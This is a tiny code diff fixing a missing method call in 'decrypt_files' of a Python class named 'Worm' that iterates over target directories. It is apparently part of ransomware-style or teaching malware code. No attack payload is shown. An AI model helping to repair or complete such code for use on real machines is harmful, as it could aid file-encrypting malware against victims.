@@ -70,7 +70,7 @@ class Worm:
 
     def decrypt_files(self):
         if not self.directories_found:
-            self.find_directories
+            self.find_directories()
 
         count = 0
         for target in self.target_dir_list:
